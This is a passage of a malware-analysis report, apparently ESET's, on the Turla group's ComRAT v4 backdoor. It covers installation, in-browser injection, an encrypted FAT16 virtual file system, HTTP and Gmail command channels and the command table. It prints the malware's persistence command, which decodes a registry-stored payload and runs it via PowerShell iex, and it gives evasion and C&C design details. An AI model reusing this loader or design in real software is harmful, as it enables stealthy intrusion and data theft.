@@ -1,0 +1,303 @@
+4. COMRAT V4
+According to its compilation timestamp, which is likely genuine, the first known sample of ComRAT v4
+was compiled in April 2017. The most recent iteration of the backdoor was, to the best of our knowledge,
+compiled in November 2019. In this section, we will describe a sample compiled in March 2019, but it is very
+similar to the latest version.
+4.1 Installation and persistence
+Based on ESET telemetry, we believe that ComRAT is installed using an existing foothold such as compromised
+credentials or via another Turla backdoor. For instance, we’ve seen ComRAT installed by PowerStallion,
+a PowerShell-based backdoor we described in 2019 [1] .
+The ComRAT installer is a PowerShell script that creates a Windows scheduled task and fills
+a registry value with the encrypted payload. The registry value is usually
+~~HKLM\SOFTWARE\Microsoft\SQMClient\Windows.WSqmCons~~
+10 From Agent.BTZ to ComRAT v4 A ten-year journey
+The Windows task is usually in ~~C:\Windows\System32\Tasks\Microsoft\Windows\~~
+~~Customer Experience Improvement Program\Consolidator~~ and contains the following command:
+
+
+cmd.exe
+/c “%SystemRoot%\System32\wsqmcons.exe & powershell.
+exe -v 2 “$QAY076ai = ‘ AKWC;HUA389933tomasoas ’;[Text.Encoding]::ASCII.
+GetString([Convert]::\”FromBase64String\”((gp HKLM:\SOFTWARE\Microsoft\SQMClient\
+Windows).WSqmCons))|iex;””
+
+
+Note that the password used to decrypt the ComRAT payload is different on each machine.
+It is interesting to note that while ComRAT’s name is derived from its use of COM object hijacking,
+in this new version the developers no longer use this method for ensuring persistence.
+4.2 Orchestrator
+The PowerShell loader is executed every time the user logs in. It is very similar to the cluster of loaders
+we described in 2019 [1] and is based on the ~~Invoke-DllInjection~~ loader from the PowerSploit framework.
+It loads the ComRAT orchestrator DLL into ~~explorer.exe~~ as shown in Figure 8.
+Figure 8 // Injection of the orchestrator into the Explorer process
+This is a C++ DLL existing in 32- and 64-bit versions. It has two exports named ~~UMEP~~ and ~~VFEP~~ ~~.~~
+The 64-bit version is called ~~x64_Release.dll~~ as shown in Figure 9.
+Figure 9 // Screenshot of ComRAT v4 64-bit orchestrator DLL in Detect It Easy
+11 From Agent.BTZ to ComRAT v4 A ten-year journey
+The orchestrator embeds an encrypted (XORed with a hardcoded key) communication module
+(a 32- or 64-bit DLL) that will be injected into the default web browser. The orchestrator interacts
+with the ComRAT communication module (described in more detail later) through a named pipe. Thus,
+all of the malware’s network communications will be initiated in the browser process, which is stealthier
+than if it was done directly by the orchestrator.
+The orchestrator has some interesting features such as a Virtual File System (VFS) in FAT16 format, which
+we describe later, and it can use Gmail to receive commands and to exfiltrate information to the operators.
+Figure 10 is an overview of ComRAT’s architecture.
+Existing access
+to the victim's computer
+Ex: PowerStallion
+Windows task
+for persistence
+Virtual FAT16
+File System
+> [_]
+Commands
+Exfiltrate documents
+to various cloud services
+Network and Active
+Directory recon
+Drop and execute additional
+malware programs
+Monitor security logs
+Encrypted payload
+in Windows Registry
+Inject
+communication
+library
+Default browser
+PowerShell
+script
+Write Create
+Load payload
+in explorer.exe
+Orchestrator running
+in explorer.exe
+HTTP request/response
+in a named pipe
+C&C Server Gmail address
+Turla operator
+Figure 10 // Summary of ComRAT architecture
+12 From Agent.BTZ to ComRAT v4 A ten-year journey
+The orchestrator is programmed to sleep outside local business hours (9 to 5, Monday to Friday),
+as shown in Figure 11.
+Figure 11 // Business hours check
+4.3 Development
+Our in-depth analysis of this malware family leads us to believe that the ComRAT developers are both
+experienced and spent time designing the malware architecture.
+We noticed that they used several design patterns. For example, they use the so-called Abstract Factory
+pattern [26] in the code responsible for parsing and creating instructions based on C&C communications,
+as shown in Figure 12. It is interesting to note that it was implemented using a C++ template. Thus, there
+is a lot of duplicated code in the compiled binary because each templated class or function will have
+a different implementation for each type it is used with.
+Figure 12 // Example of Abstract Factory method pattern
+They also have used other design patterns, such as the Adapter pattern [27], shown in Figure 13,
+and the Mediator pattern [28], shown in Figure 14.
+Figure 13 // Example of Adapter pattern
+Figure 14 // Example of Mediator pattern
+It should be noted that, in addition to complex elements such as a FAT16 VFS, ComRAT’s developers
+use some obfuscation. Most of the strings in their binaries are string-stacked and encrypted, with a different
+key per sample, with the apparent goal of preventing easy detection of this malware family.
+Finally, they use several third-party libraries:
+   - _[fat_io_lib](https://github.com/ultraembedded/fat_io_lib)_ : for the Virtual File System
+
+
+   - _[Gumbo](https://github.com/google/gumbo-parser)_ : to parse HTML
+
+
+   - _[wolfCrypt](https://github.com/wolfSSL/wolfssl)_ : for C&C data (en|de)cryption
+
+Overall, it tells us that the Turla group tasked experienced developers for this new version of ComRAT.
+Both the development effort and the technologies used, such as the Virtual File System, make it a counterpart
+of Carbon [13] and Gazer [14] .
+13 From Agent.BTZ to ComRAT v4 A ten-year journey
+4.4 Virtual File System and configuration
+All the files related to ComRAT, except the orchestrator DLL and scheduled task, are stored in a Virtual
+File System. This is a regular file stored at one of these locations:
+   - ~~%TEMP%\FXSAPIDebugTrace.txt~~
+
+
+   - ~~%TEMP%\iecache.bin~~
+
+However, once decrypted, these files are FAT16 partition images, as shown in Figure 15.
+Figure 15 // First bytes of the decrypted FAT16 Virtual File System
+The encryption key is unique per machine, as it is generated during the installation. It uses a variant
+of Mersenne Twister and takes its seed from ~~std::_Random_device~~ . This 32-byte key is then stored
+in ~~(HKLM|HKCU)\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\~~
+~~{59031A47-3F72-44A7-80C5-5595FE6B30EE}\Order~~
+The VFS is encrypted using AES-256 in XTS mode. This mode of operation is a standard for disk encryption.
+The first 16-bytes of the key are used for the block encryption while the last 16-bytes are used to derive
+the initialization vector from the sector number.
+The default VFS container file is hardcoded in the orchestrator and dropped the first time it is executed.
+Then, most of the files can be updated using backdoor commands.
+It uses UNIX-like paths so, for example, the log file is located at ~~/var/log/working.c4log~~ ~~.~~ The malware
+uses a third-party library, fat_io_lib, to read the partition. Figure 16 is an overview of the files and folders
+in the VFS.
+14 From Agent.BTZ to ComRAT v4 A ten-year journey
+FAT16 Virtual
+File System
+
+Probably contains
+modules (PE executables)
+but we haven’t seen any
+in the wild.
+Contains
+log files
+Contains the configuration
+related to C&C communications
+Contains the encryption
+keys (AES and RSA)
+used for the C&C communications
+Contains backdoor commands that will be executed
+automatically. For example, /etc/auto_exec/send_log.c4
+executes the backdoor command 106: SendWorkingLog .
+Contains commands
+executed at startup.
+Figure 16 // Virtual File System hierarchy
+It is interesting to note that some files use extensions such as ~~c4~~ or ~~c4log~~, where c4 most likely stands
+for Chinch 4, the internal name of the malware family.
+By mounting the Virtual File System, we get access to all these files. Figure 17 is an example
+of ~~/etc/transport/legacy/get.list~~ content. This is a list of C&C domains separated with a pipe.
+Figure 17 // Content of ~~/etc/transport/legacy/get.list~~
+15 From Agent.BTZ to ComRAT v4 A ten-year journey
+4.5 Command & Control channels
+ComRAT v4 has two different C&C channels: HTTP (internally known as ~~legacy~~ ~~)~~ and email
+(internally known as ~~mail~~ ~~)~~, which uses the Gmail web interface. The mode to be used
+( ~~legacy~~ ~~,~~ ~~mail~~ or ~~any~~ ) is specified in the file ~~/etc/transport/service/current_transport.str~~
+Communication module
+The orchestrator retrieves the default browser, by checking ~~HKCR\http\shell\open\command,~~
+and injects the communication DLL, either 32- or 64-bit, into it. These DLLs are hardcoded in the orchestrator
+and XORed with a static key.
+This module is quite simple as it is just a “bridge” between the orchestrator and the C&C server. The goal
+is probably to make the malware’s HTTP requests to its C&C appear to be from a process that would
+be expected to connect to the internet and make HTTP requests.
+The orchestrator uses a named pipe to interact with the communication module. The pipe name is derived
+from the computer name as shown on Figure 18.
+Figure 18 // Generation of the pipe name
+The orchestrator sends C&C requests to the communication module, which sends them to the C&C server,
+and that module sends any responses or new commands from the C&C server to the orchestrator,
+using the same pipe.
+The communication DLL is slightly obfuscated, in a very similar way to many other Turla malware families.
+All the strings are string-stacked, some of them XORed, and most of the Windows APIs it uses are resolved
+dynamically.
+Legacy/HTTP[S]
+The most basic C&C mode is what the ComRAT developers called ~~legacy~~ mode. Indeed, it is the exact same
+protocol as implemented in ComRAT v3.x.
+We believe that it is intended to be compatible with C&C servers already in place, avoiding the need
+to deploy a whole new set of servers. It also gives the operators the flexibility to control old ComRAT
+instances without the need to upgrade all the victims to version 4. Even if this is an old C&C protocol,
+it was still being used in the wild in 2020.
+Two lists of C&C servers are stored in the VFS at the paths: ~~/etc/transport/legacy/get.list~~
+and ~~/etc/transport/legacy/post.list~~
+They generally each contain two or three different domains, separated with a pipe character.
+The format of the URL is quite easy to recognize as it hasn’t changed for years:
+~~http[s]:///index/index.php?h=&d=~~
+The ~~h~~ parameter contains an 8-byte XOR key encoded in base64. It is generated using the ~~rand~~ function
+seeded by the result of a call to the ~~GetTickCount~~ function.
+The ~~d~~ parameter contains the base64-encoded data. It is encrypted using the XOR key in the ~~h~~ parameter.
+16 From Agent.BTZ to ComRAT v4 A ten-year journey
+Email
+The second C&C mode is called ~~mail~~ by ComRAT developers. The code is actually very specific to Gmail
+and we haven’t seen any other version of ComRAT able to use another email provider.
+A basic overview of the email C&C mode is shown Figure 19.
+Send
+commands
+by email
+Control
+the mailbox
+Operator mailbox Turla operator
+(often on GMX)
+Receive
+command results
+by email
+Figure 19 // Overview of the email C&C mode
+Step 1
+The orchestrator reads the email address in ~~/etc/transport/mail/mailboxes/0/command_addr~~
+It also reads the cookies to authenticate on Gmail in ~~/etc/transport/mail/mailboxes/0/cookie~~
+These cookies typically have a limited lifetime so they should be updated from time to time.
+Figure 20 is a redacted screenshot of the contents of the cookie file.
+Figure 20 // Contents of ~~/etc/transport/mail/mailboxes/0/cookie.str~~ (partially redacted)
+17 From Agent.BTZ to ComRAT v4 A ten-year journey
+Step 2
+It connects to the basic HTML view of Gmail at the URL https://mail.google.com/mail/?ui=html&zy=g using
+the cookies described above. An example of such a view is shown Figure 21.
+Figure 21 // Example of the Gmail simplified HTML view
+(for demonstration purpose only)
+Step 3
+It parses the inbox HTML page using the Gumbo HTML parser in order to extract the list of emails. It will only
+read emails for which the Subject: is in the list at ~~/etc/transport/mail/service/subject~~ ~~,~~ as shown
+in Figure 22.
+Figure 22 // Contents of ~~/etc/transport/mail/service/subject~~
+Then, for each email, it extracts the link to download the attachment. The attachments are generally
+masquerading as documents with names such as ~~document.docx~~ and ~~documents.xlsx~~ ~~.~~ The body
+of the email is generally empty. Figure 23 is an example of an email sent by Turla operators
+to a ComRAT C&C mailbox.
+Figure 23 // Email from the Gmail inbox that contains commands in the attachment
+(partially redacted and opened in Microsoft Outlook for demonstration purposes only)
+18 From Agent.BTZ to ComRAT v4 A ten-year journey
+Step 4
+It downloads all the relevant attachments from Gmail. The email is then deleted so that it is not processed
+a second time.
+Step 5
+Despite their extensions, the attachments are not docx or xslx files. They contain a blob of data
+in the following format:
+0 4 8 9 9+n
+ CRC32 of the 0x01 AES-encrypted
+encrypted data data
+The AES-256 key is stored in the VFS in ~~/etc/pki/aes_key~~ and it uses AES in CBC mode with
+a null initialization vector.
+Step 6
+Once decrypted, we have access to the backdoor commands and parameters. We provide more details
+about the backdoor commands in section 4.6. Figure 24 is an example of a decrypted email attachment.
+0x67 is the ID for “Execute a command with ~~cmd.exe~~ ” and it is followed by the command to execute.
+We believe that the beginning of the decrypted data is filled with random bytes.
+Figure 24 // Decrypted attachment
+Step 7
+The backdoor creates an attachment containing the result of the commands. The attachment name consists
+of 20 random digits and of the ~~.jpg.bfe~~ so-called double extension. Its content has the following format:
+0 4 8 9 265 265+n
+RSA-encrypted
+AES key (+padding)
+The AES key is different for each email as it is randomly generated. Then, it is encrypted using RSA-2048
+with the public key stored in ~~/etc/pki/public_cert.pki~~ ~~.~~ The format of the key is quite unusual
+as it is raw bytes representing the concatenation of ~~n~~ and ~~e~~ . Turla’s developers did not implement
+the RSA encryption themselves; they used code from the wolfSSL library and more specifically
+from a commit before March 2016.
+19 From Agent.BTZ to ComRAT v4 A ten-year journey
+Finally, and using the Gmail web interface as before, the backdoor sends the email to the address contained
+in ~~/etc/transport/mail/mailboxes/0/answer_addr~~ ~~.~~ This address is typically not hosted on Gmail
+but rather on GMX or VFEmail. It is also the email address from which the operators send commands
+to the Gmail address. Figure 25 is an example of an email created by ComRAT.
+Figure 25 // Email sent by ComRAT to the operators’ email address (partially redacted and opened
+in Microsoft Outlook for demonstration purposes only)
+4.6 Backdoor commands
+The operators can send commands using either of the C&C channels. The backdoor will receive
+the command ID and the arguments, if any.
+As seen in Table 1, the commands implemented in ComRAT v4 are not surprising and allow control of almost
+everything on the machine: manage files, execute additional processes or gather logs.
+~~Table 1~~ ~~List of backdoor commands in ComRAT v4~~
+ID Name Description
+0x65 WriteFile Write in a file
+0x66 ReadFile Read a file
+0x67 ShellExecute Execute a command with ~~cmd.exe~~
+0x68 SetTimeout Set the timeout for the C&C channel
+Add an address in ~~/etc/transport/legacy/get.list~~
+0x69 AddAddress
+or in ~~/etc/transport/legacy/post.list~~
+0x6a SendWorkingLog Send ~~/var/log/working.c4log~~
+0x6b InvokeBinFromMem Load a PE from memory using an internal PE loader
+0x6c InvokeBinFromFS Load a PE from file using an internal PE loader
+Delete an address from ~~/etc/transport/legacy/get.list~~
+0x6d DeleteAddress
+or ~~/etc/transport/legacy/post.list~~
+0x6e GetConfiguration Get the configuration
+0x6f DirStg List a directory in the Virtual File System
+0x70 RunExe Execute a PE with ~~CreateProcessW~~
+Invoke a PowerShell script from memory using
+0x71 InvokePSFromMem
+a PowerShell runner
+Invoke a PowerShell script from a file using
+0x72 InvokePSFromFS
+a PowerShell runner
+Delete the messages in the Gmail mailbox (added in the most
+0x73 DeleteAllMail
+recent version, first seen around November 2019)
+20 From Agent.BTZ to ComRAT v4 A ten-year journey
